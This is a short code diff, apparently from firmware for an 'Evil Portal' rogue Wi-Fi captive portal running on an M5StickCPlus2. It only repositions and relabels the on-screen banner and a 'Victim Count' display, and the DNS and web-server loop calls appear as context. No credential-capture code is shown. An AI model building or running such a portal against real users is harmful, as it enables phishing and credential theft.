@@ -162,8 +162,8 @@ void loop() {
     M5.Lcd.setTextSize(1.5);
  
     M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-    M5.Lcd.setCursor(5, 15);
-    M5.Lcd.print("M5StickCPlus2 Evil Portal");
+    M5.Lcd.setCursor(25, 15);
+    M5.Lcd.print("*** Evil Portal ***");
  
     M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
     M5.Lcd.setCursor(25, 35);
@@ -171,12 +171,12 @@ void loop() {
     M5.Lcd.print(APIP);
  
     M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-    M5.Lcd.setCursor(25, 50);
+    M5.Lcd.setCursor(40, 70);
     M5.Lcd.print("Victim Count: ");
     M5.Lcd.print(capcount); 
 
     M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-    M5.Lcd.setCursor(80, 100);
+    M5.Lcd.setCursor(60, 100);
     M5.Lcd.print("CtrlAltDel."); 
   }
   dnsServer.processNextRequest(); webServer.handleClient();
